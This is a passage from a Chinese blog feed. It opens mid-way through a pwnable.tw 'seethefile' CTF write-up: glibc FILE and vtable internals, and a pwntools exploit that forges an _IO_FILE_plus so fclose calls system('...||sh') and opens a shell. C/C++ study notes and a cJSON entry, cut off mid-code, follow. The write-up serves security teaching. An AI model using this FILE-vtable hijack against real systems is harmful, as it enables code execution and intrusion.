punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">,</span> __pbackfail<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* showmany */</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsgetn_t<span class="token punctuation">,</span> __xsgetn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekoff_t<span class="token punctuation">,</span> __seekoff<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekpos_t<span class="token punctuation">,</span> __seekpos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">,</span> __setbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">,</span> __sync<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_doallocate_t<span class="token punctuation">,</span> __doallocate<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_read_t<span class="token punctuation">,</span> __read<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_write_t<span class="token punctuation">,</span> __write<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seek_t<span class="token punctuation">,</span> __seek<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_close_t<span class="token punctuation">,</span> __close<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_stat_t<span class="token punctuation">,</span> __stat<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_showmanyc_t<span class="token punctuation">,</span> __showmanyc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_imbue_t<span class="token punctuation">,</span> __imbue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>    get_column<span class="token punctuation">;</span>    set_column<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* We always allocate an extra word following an _IO_FILE.   This contains a pointer to the function jump table used.   This is for compatibility with C++ streambuf; the word can   be used to smash to a pointer to a virtual function table. */</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span><span class="token punctuation">&#123;</span>  _IO_FILE file<span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span>_IO_list_all<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选项五 <code>exit</code> 输入 <code>name</code> 之后会执行 <code>fclose</code> 函数，其源码如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_IS_FILEBUF</span> <span class="token expression"><span class="token number">0x2000</span></span></span><span class="token comment">/* https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/iofclose.c#L37 */</span><span class="token keyword">int</span><span class="token function">_IO_new_fclose</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">/* First unlink the stream.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_file_flags <span class="token operator">&amp;</span> _IO_IS_FILEBUF<span class="token punctuation">)</span>    <span class="token function">_IO_un_link</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_file_flags <span class="token operator">&amp;</span> _IO_IS_FILEBUF<span class="token punctuation">)</span>    status <span class="token operator">=</span> <span class="token function">_IO_file_close_it</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    status <span class="token operator">=</span> fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_ERR_SEEN <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_IO_FINISH</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到：如果 <code>fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF</code> 这个判断为真，会执行 <code>_IO_un_link</code> 和 <code>_IO_file_close_it</code> 这两个函数，尽量避免，所以我们伪造的 <code>IO_FILE</code> 结构体的 <code>flag</code> 字段和 <code>_IO_IS_FILEBUF</code>(0x2000) 进行与运算的时候最好为 0。后面会执行 <code>_IO_FINISH </code>这个函数存放在 <code>vtable</code> 的第三个字段上（即 <code>__finish</code>），偏移8个字节。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>伪造一个 <code>_IO_FILE_plus</code> 结构体，使其 <code>vtable</code> 字段指向伪造的 <code>vtable</code> 表，然后在伪造的 <code>vtable</code> 表中存放 <code>__finish</code> 的位置上放 <code>system</code> 函数的地址。然后执行 <code>fclose(fp)</code> 即可 getshell。</p><p>具体做法：在伪造的 <code>_IO_FILE_plus</code> 结构体的开头存放 <code>p32(0xffffdfff) + &#39;||sh&#39;</code>（这样后面执行 <code>fclose(fp)</code> 的时候相当于执行 <code>system(&quot;\xff\xff\xdf\xff||sh&quot;)</code>），其他位置全部置为 <code>\x00</code>。然后在伪造的 <code>vtable</code> 的第三个字段上存 <code>system</code> 函数的地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc_32.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chall.pwnable.tw'</span><span class="token punctuation">,</span> <span class="token number">10200</span><span class="token punctuation">)</span><span class="token comment">#p = process('./seethefile')</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">)</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What do you want to see :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/proc/self/maps'</span><span class="token punctuation">)</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'[heap]\n'</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x1000</span>system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libcbasepayload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804B290</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span>\  p32<span class="token punctuation">(</span><span class="token number">0xffffdfff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'||sh'</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x94</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span>\  p32<span class="token punctuation">(</span><span class="token number">0x804B328</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>choice<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Leave your name :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>后面还需要用那个 <code>get_flag</code> 来读 flag，看一下源码就知道怎么做了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++学习笔记</title>
      <link href="/2022/01/27/c-yu-yan-xue-xi-bi-ji/"/>
      <url>/2022/01/27/c-yu-yan-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言学习笔记"><a href="#C语言学习笔记" class="headerlink" title="C语言学习笔记"></a>C语言学习笔记</h1><h2 id="define"><a href="#define" class="headerlink" title="#define"></a><code>#define</code></h2><ul><li><p>C语言中，可以用 <code>#define</code> 定义标识符。其特点是：定义的标识符不占内存，只是一个临时的符号，预编译后这个符号就不存在了。预编译又叫预处理。预编译不是编译，而是编译前的处理。这个操作是在正式编译之前由系统自动完成的。<code>#define</code> 和 <code>#include</code> 类似，凡是以“#”开头的均为预处理指令。（出处：<a href="http://c.biancheng.net/view/187.html">C语言中文网</a>）</p></li><li><p><code>#define</code>的几种类型：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* 定义常量 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">A</span> <span class="token expression"><span class="token number">10</span></span></span><span class="token comment">/* 定义表达式 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>B<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* 特殊符号 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">A</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> T_</span><span class="token punctuation">##</span><span class="token expression">x</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">B</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> #@x</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">C</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> #x</span></span><span class="token comment">/** 输入: A(a); 输出: T_a.* 输入: B(a); 输出: 'a'.* 输入: C(a); 输出: "a".*/</span><span class="token comment">/* 分行 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">FUN</span><span class="token expression"><span class="token punctuation">(</span>A<span class="token punctuation">,</span>B<span class="token punctuation">,</span>C<span class="token punctuation">)</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">void</span> A</span><span class="token punctuation">##</span><span class="token expression"><span class="token function">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></span><span class="token punctuation">\</span>    <span class="token expression">std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span>#C<span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">&#125;</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="extern-quot-C-quot"><a href="#extern-quot-C-quot" class="headerlink" title="extern &quot;C&quot;"></a><code>extern &quot;C&quot;</code></h2><ul><li><p><code>extern &quot;C&quot;</code>的主要作用就是为了能够正确实现C++代码调用其他C语言代码。加上 <code>extern &quot;C&quot;</code>后，会指示编译器这部分代码按C语言的进行编译，而不是C++的。由于C++支持函数重载，因此编译器编译函数的过程中会将函数的参数类型也加到编译后的代码中，而不仅仅是函数名；但C语言并不支持函数重载，因此编译C语言代码的函数时不会带上函数的参数类型，一般只包括函数名。这是二者在编译时的主要区别。</p></li><li><p>例子：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span><span class="token keyword">extern</span> <span class="token string">"C"</span><span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a><code>__stdcall</code></h3><p>被这个关键字修饰的函数，其参数都是从右向左通过堆栈传递的(__fastcall 的前面部分由ecx,edx传)， 函数调用在返回前要由被调用者清理堆栈。</p><ul><li>例子：<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> __stdcall <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h2><p><a href="https://blog.csdn.net/as7790719/article/details/80224916#:~:text=const%20int%20%2A%20a%3B%20%E8%A1%A8%E7%A4%BAa%E6%98%AF%E4%B8%80%E4%B8%AA%E6%8C%87%E9%92%88%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BB%BB%E6%84%8F%E6%8C%87%E5%90%91int%E5%B8%B8%E9%87%8F%E6%88%96%E8%80%85int%E5%8F%98%E9%87%8F%EF%BC%8C%E5%AE%83%E6%80%BB%E6%98%AF%E6%8A%8A%E5%AE%83%E6%89%80%E6%8C%87%E5%90%91%E7%9A%84%E7%9B%AE%E6%A0%87%E5%BD%93%E4%BD%9C%E4%B8%80%E4%B8%AAint%E5%B8%B8%E9%87%8F%E3%80%82%20%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%86%99%E6%88%90int%20const,%2A%20a%3B%E5%90%AB%E4%B9%89%E7%9B%B8%E5%90%8C%E3%80%82%20int%20%2A%20const%20a%3B%20%E8%A1%A8%E7%A4%BA%E4%B8%80%E4%B8%AA%E6%98%AF%E4%B8%80%E4%B8%AA%E6%8C%87%E9%92%88%E5%B8%B8%E9%87%8F%EF%BC%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E7%9A%84%E6%97%B6%E5%80%99%E5%BF%85%E9%A1%BB%E5%9B%BA%E5%AE%9A%E6%8C%87%E5%90%91%E4%B8%80%E4%B8%AAINT%E5%8F%98%E9%87%8F%EF%BC%8C%E4%B9%8B%E5%90%8E%E5%B0%B1%E4%B8%8D%E8%83%BD%E5%86%8D%E6%8C%87%E5%90%91%E5%88%AB%E7%9A%84%E5%9C%B0%E6%96%B9%E4%BA%86%E3%80%82">const int a; int const a; const int *a; int * const a; int const * a const; 之间的区别</a></p><h1 id="C-学习笔记"><a href="#C-学习笔记" class="headerlink" title="C++学习笔记"></a>C++学习笔记</h1><h2 id="explicit"><a href="#explicit" class="headerlink" title="explicit"></a>explicit</h2><p><code>explicit</code>关键字只需用于类内的单参数构造函数前。由于无参数的构造函数和多参数的构造函数总是显式调用，这种情况在构造函数前加 <code>explicit</code>无意义。</p><p>google的c++规范中提到：<code>explicit</code>的优点是可以避免不合时宜的类型变换，缺点无。所以google约定所有单参数的构造函数都必须是显式的，只有极少数情况下拷贝构造函数可以不声明成 <code>explicit</code>，例如作为其他类的透明包装器的类。<br>effective c++中说：被声明为explicit的构造函数通常比其non-explicit兄弟更受欢迎。因为它们禁止编译器执行非预期（往往也不被期望）的类型转换。除非我有一个好理由允许构造函数被用于隐式类型转换，否则我会把它声明为explicit，鼓励大家遵循相同的政策。</p><h2 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h2><p><a href="https://www.runoob.com/w3cnote/cpp-enum-intro.html">enum</a></p><h2 id="常量字符串"><a href="#常量字符串" class="headerlink" title="常量字符串"></a>常量字符串</h2><p>在C语言中，常量的 <code>char*-based</code> 字符串为：<code>const char* const tmp = &quot;blogg9ggg&quot;;</code></p><p>在C++中，定义成 <code>string</code> 往往更好：<code>const std::string tmp(&quot;blogg9ggg&quot;);</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> s<span class="token punctuation">;</span><span class="token comment">// 普通指针</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p <span class="token operator">=</span> s<span class="token punctuation">;</span><span class="token comment">// non-const pointer, const data</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> p <span class="token operator">=</span> s<span class="token punctuation">;</span><span class="token comment">// const pointer, non-const data</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> p <span class="token operator">=</span> s<span class="token punctuation">;</span><span class="token comment">// const pointer, const data</span><span class="token comment">// 如果 const 出现在 * 左边，代表被指物是常量；</span><span class="token comment">// 如果 const 出现在 * 右边，代表指针是常量；</span><span class="token comment">// 如果出现在 * 两边，代表都是常量。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>copy构造函数被用来“以同类型对象初始化自我对象”，copy assignment操作符被用来“从另一个同类型对象中拷贝其值到</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Widget</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">Widget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//default构造函数</span><span class="token function">Widget</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//copy构造函数</span>Widget<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//copy assignment操作符</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Widget w1<span class="token punctuation">;</span><span class="token comment">//调用default构造函数</span>Widget <span class="token function">w2</span><span class="token punctuation">(</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用copy构造函数</span>w1 <span class="token operator">=</span> w2<span class="token punctuation">;</span><span class="token comment">//调用copy assignment操作符</span>Widget w3 <span class="token operator">=</span> w2<span class="token punctuation">;</span><span class="token comment">//调用copy构造函数！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="博客-1"><a href="#博客-1" class="headerlink" title="博客"></a>博客</h2><p><a href="https://www.runoob.com/cplusplus/cpp-namespaces.html">namespace</a></p><p><a href="http://c.biancheng.net/cpp/biancheng/view/3297.html">四种类型转换运算符：static_cast、dynamic_cast、const_cast和reinterpret_cast</a></p><p><a href="https://www.runoob.com/w3cnote/cpp-virtual-functions.html">C++ 虚函数和纯虚函数的区别</a></p>]]></content>
      
      
      <categories>
          
          <category> 粗糙笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cJSON学习笔记</title>
      <link href="/2022/01/27/cjson-xue-xi-bi-ji/"/>
      <url>/2022/01/27/cjson-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="cJSON学习笔记"><a href="#cJSON学习笔记" class="headerlink" title="cJSON学习笔记"></a>cJSON学习笔记</h1><p>cJSON 总共有以下 8 种数据类型：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* cJSON Types: */</span><span class="token comment">/** 用 8-bit 表示 8 种数据类型*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_Invalid</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_False</span>  <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_True</span>   <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_NULL</span>   <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_Number</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_String</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_Array</span>  <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_Object</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">cJSON_Raw</span>    <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> </span><span class="token comment">/* raw json */</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Hooks"><a href="#Hooks" class="headerlink" title="Hooks"></a>Hooks</h2><p>该项目在调用内存分配、清理函数时用到了Hook技术。</p><ol><li><p>先定义 <code>internal_hooks</code> 数据结构，在结构体内声明 <code>allocate,deallocate,reallocate</code>这3个函数。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">internal_hooks</span><span class="token punctuation">&#123;</span>    <span class="token comment">/* 分配 */</span>    <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span>CJSON_CDECL <span class="token operator">*</span>allocate<span class="token punctuation">)</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* 解除 */</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span>CJSON_CDECL <span class="token operator">*</span>deallocate<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pointer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* 重分配 */</span>    <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span>CJSON_CDECL <span class="token operator">*</span>reallocate<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pointer<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> internal_hooks<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>特殊处理 <code>MSVC error C2322</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>_MSC_VER<span class="token punctuation">)</span></span></span><span class="token comment">/* work around MSVC error C2322: '...' address of dllimport 